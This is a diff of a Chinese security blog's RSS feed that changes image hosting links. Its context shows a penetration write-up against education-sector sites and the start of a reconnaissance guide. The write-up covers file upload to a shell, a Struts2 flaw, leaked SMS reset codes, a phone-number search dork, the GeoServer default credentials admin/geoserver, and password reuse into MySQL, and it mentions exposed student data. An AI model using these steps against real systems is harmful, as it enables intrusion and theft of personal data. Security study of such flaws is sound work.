-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png">
         
     </a></p>
 <p>上传点任意文件上传GetShell</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png">
         
     </a></p>
 <h2 id="8s2反序列化漏洞getshell" class="headerLink">
     <a href="#8s2%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>8、S2反序列化漏洞GetShell</h2><p>1、目标网站存在S2框架</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png">
         
     </a></p>
 <p>2、直接使用工具进行扫描，进而获取权限进行内网渗透</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png">
         
     </a></p>
 <h2 id="9逻辑漏洞" class="headerLink">
     <a href="#9%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" class="header-mark"></a>9、逻辑漏洞</h2><h2 id="找回密码-1" class="headerLink">
     <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81-1" class="header-mark"></a>找回密码</h2><p>1、某站点找回密码处，短信验证码直接出现在回包中</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png">
         
     </a></p>
 <p>2、谷歌语法搜索 &ldquo;XX大学&rdquo; &ldquo;手机号&rdquo; filetype:xls 找到一些手机号码</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png">
         
     </a></p>
 <p>3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png">
         
     </a></p>
 <p>但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png">
         
     </a></p>
 <h2 id="统一门户-1" class="headerLink">
     <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7-1" class="header-mark"></a>统一门户</h2><p>使用学号加身份证后六位直接登录统一服务平台</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png">
         
     </a></p>
 <h2 id="10geoserver弱口令" class="headerLink">
     <a href="#10geoserver%e5%bc%b1%e5%8f%a3%e4%bb%a4" class="header-mark"></a>10、geoserver弱口令</h2><p>8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/attach-2b467edae299849fded88fedaab939758dc8bb10.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/attach-2b467edae299849fded88fedaab939758dc8bb10.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/attach-2b467edae299849fded88fedaab939758dc8bb10.png" title="image.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/attach-2b467edae299849fded88fedaab939758dc8bb10.png">
         
     </a></p>
 <h2 id="获取数据库密码" class="headerLink">
     <a href="#%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae%e5%ba%93%e5%af%86%e7%a0%81" class="header-mark"></a>获取数据库密码</h2><p>登录后进入配置页面，点击查看其中的数据存储</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png">
         
     </a></p>
 <p>F12查看网页源代码，读取PostgreSQL密码：</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png">
         
     </a></p>
 <h2 id="撞库" class="headerLink">
     <a href="#%e6%92%9e%e5%ba%93" class="header-mark"></a>撞库</h2><p>同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png">
         
     </a></p>
 <p>在其中一个log表中发现了账号和MD5加密的密码。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png">
         
     </a></p>
 <h2 id="getshell" class="headerLink">
     <a href="#getshell" class="header-mark"></a>GetShell</h2><p>8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了）</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png">
         
     </a></p>
 <h2 id="总结" class="headerLink">
@@ -302,10 +302,10 @@
 <p>总结起来就是多信息收集，信息收集yyds</p>]]></description>
 </item><item>
     <title>万字总结信息收集全网最全</title>
-    <link>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
+    <link>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
     <pubDate>Fri, 26 Apr 2024 18:19:39 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
+    </author><guid>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2841" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2841</a></em></p>
 </blockquote>
@@ -491,17 +491,17 @@
 <p><strong>电话反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
 <h3 id="爱站" class="headerLink">
     <a href="#%e7%88%b1%e7%ab%99" class="header-mark"></a>爱站</h3><p><a href="https://whois.aizhan.com/" target="_blank" rel="noopener noreferrer">https://whois.aizhan.com/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" title="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-6b0c89cb5e9c67a076c770ff866bc4828a637fea.png">
         
     </a></p>
 <h3 id="微步" class="headerLink">
     <a href="#%e5%be%ae%e6%ad%a5" class="header-mark"></a>微步</h3><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png" title="image-20240318211050117" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png" title="image-20240318211050117" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-604de8d0d82a771abccecab60d17a4602b3a64e2.png">
         
     </a></p>
 <h3 id="国外的whois" class="headerLink">
     <a href="#%e5%9b%bd%e5%a4%96%e7%9a%84whois" class="header-mark"></a>国外的who.is</h3><p><a href="https://who.is/" target="_blank" rel="noopener noreferrer">https://who.is/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-89bff3e05618bd3349d50461833488d162c42dc5.png" title="image-20240318211100783" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-89bff3e05618bd3349d50461833488d162c42dc5.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-89bff3e05618bd3349d50461833488d162c42dc5.png" title="image-20240318211100783" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-89bff3e05618bd3349d50461833488d162c42dc5.png">
         
     </a></p>
 <h3 id="阿里云域名信息查询" class="headerLink">
@@ -514,39 +514,39 @@
     <a href="#icpinternet-content-provider%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>ICP(Internet Content Provider)备案查询</h2><p>可以查询该单位备案的其它网站</p>
 <h3 id="国家企业信用信息公示系统" class="headerLink">
     <a href="#%e5%9b%bd%e5%ae%b6%e4%bc%81%e4%b8%9a%e4%bf%a1%e7%94%a8%e4%bf%a1%e6%81%af%e5%85%ac%e7%a4%ba%e7%b3%bb%e7%bb%9f" class="header-mark"></a>国家企业信用信息公示系统</h3><p><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener noreferrer">http://www.gsxt.gov.cn/index.html</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png" title="image-20240318211116598" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png" title="image-20240318211116598" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-a18add304d0d2c057fa95ced5200752df7b29e1a.png">
         
     </a></p>
 <h3 id="icp备案查询网" class="headerLink">
     <a href="#icp%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2%e7%bd%91" class="header-mark"></a>ICP备案查询网</h3><p><a href="https://www.beianx.cn/" target="_blank" rel="noopener noreferrer">https://www.beianx.cn/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png" title="image-20240318211229330" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png" title="image-20240318211229330" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-8a7aa2e4b0a4ad3bf8c8723fa4086dae4a67f15e.png">
         
     </a></p>
 <h3 id="icp备案查询---站长工具" class="headerLink">
